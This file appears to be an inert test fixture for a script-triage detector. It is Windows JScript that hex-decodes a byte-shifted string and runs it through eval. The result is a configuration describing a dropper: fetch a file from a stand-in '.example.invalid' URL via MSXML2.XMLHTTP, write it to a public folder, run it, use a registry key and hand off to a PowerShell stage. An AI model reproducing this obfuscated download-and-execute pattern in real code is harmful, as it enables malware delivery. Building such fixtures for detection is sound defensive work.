// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
var decode_a095b808 = function decode_a095b808_body(SoUrCeByTeS) {
  var DeCoDeDByTeS = [];
  for (var i = 0; i < SoUrCeByTeS.length; i++) { DeCoDeDByTeS.push((SoUrCeByTeS[i] + 29) % 256); }
  return DeCoDeDByTeS;
};
var recover_c2d79d02 = function recover_c2d79d02_body() {
  // configuration reconstruction
  var packedText = "5e:05:56:57:48:53:56:05:1d:3e:05:44:46:54:58:4c:55:48:42:55:48:50:52:57:48:05:0f:05:5a:55:4c:57:48:42:49:4c:4f:48:05:0f:05:47:4c:56:53:44:57:46:4b:42:53:55:52:46:48:56:56:05:0f:05:4b:44:51:47:52:49:49:42:56:46:55:4c:53:57:05:40:0f:05:44:47:44:53:57:48:55:05:1d:05:30:36:3b:30:2f:15:11:3b:30:2f:2b:37:37:33:11:19:11:13:05:0f:05:59:44:4f:58:48:56:05:1d:5e:05:46:44:50:53:44:4c:4a:51:42:4c:47:05:1d:05:46:44:50:53:44:4c:4a:51:10:1a:1a:15:1a:17:15:49:14:14:44:05:0f:05:58:55:4f:05:1d:05:4b:57:57:53:56:1d:12:12:1a:1a:15:1a:17:15:49:14:14:44:11:48:5b:44:50:53:4f:48:11:4c:51:59:44:4f:4c:47:12:46:18:14:45:1c:45:1c:18:11:47:44:57:05:0f:05:58:56:48:55:42:44:4a:48:51:57:05:1d:05:2b:58:51:57:55:48:56:56:2f:44:45:12:1a:1a:15:1a:17:15:49:14:14:44:05:0f:05:49:4c:4f:48:42:53:44:57:4b:05:1d:05:26:1d:3f:3f:38:56:48:55:56:3f:3f:33:58:45:4f:4c:46:3f:3f:2b:58:51:57:55:48:56:56:2f:44:45:3f:3f:56:57:44:4a:48:10:1a:1a:15:1a:17:15:49:14:14:44:11:47:44:57:05:0f:05:55:48:4a:4c:56:57:55:5c:42:53:44:57:4b:05:1d:05:2b:2e:26:38:3f:3f:36:52:49:57:5a:44:55:48:3f:3f:2b:58:51:57:55:48:56:56:2f:44:45:3f:3f:27:4c:56:53:52:56:44:45:4f:48:3f:3f:1a:1a:15:1a:17:15:49:14:14:44:05:0f:05:51:48:5b:57:42:56:57:44:4a:48:05:1d:05:55:48:56:52:58:55:46:48:10:56:44:50:53:4f:48:11:53:56:14:05:60:0f:05:56:57:44:4a:48:26:52:58:51:57:05:1d:17:60";
  var packedParts = packedText.split(":");
  var SoUrCeByTeS = [];
  for (var hi = 0; hi < packedParts.length; hi++) { SoUrCeByTeS.push(parseInt(packedParts[hi], 16)); }
  var NeUtRaL = ["north", "south"].join(":");
  var DeCoDeDByTeS = [];
  try { DeCoDeDByTeS = decode_a095b808.call(null, SoUrCeByTeS); } catch (ignored) { DeCoDeDByTeS = []; }
  var DeScRiPtOrTeXt = DeCoDeDByTeS.length ? String.fromCharCode(DeCoDeDByTeS[0]) : "", bi = 1;
  for (bi = 1; bi < DeCoDeDByTeS.length; bi++) { DeScRiPtOrTeXt = DeScRiPtOrTeXt.concat(String.fromCharCode(DeCoDeDByTeS[bi])); }
  return DeScRiPtOrTeXt;
  // end reconstruction
};
var inspect_5e207d18 = function inspect_5e207d18_body() {
  var DeScRiPtOr = eval("(" + recover_c2d79d02.call(null) + ")");
  return { steps: DeScRiPtOr.steps, adapter: DeScRiPtOr.adapter, values: DeScRiPtOr.values, stageCount: DeScRiPtOr.stageCount };
};
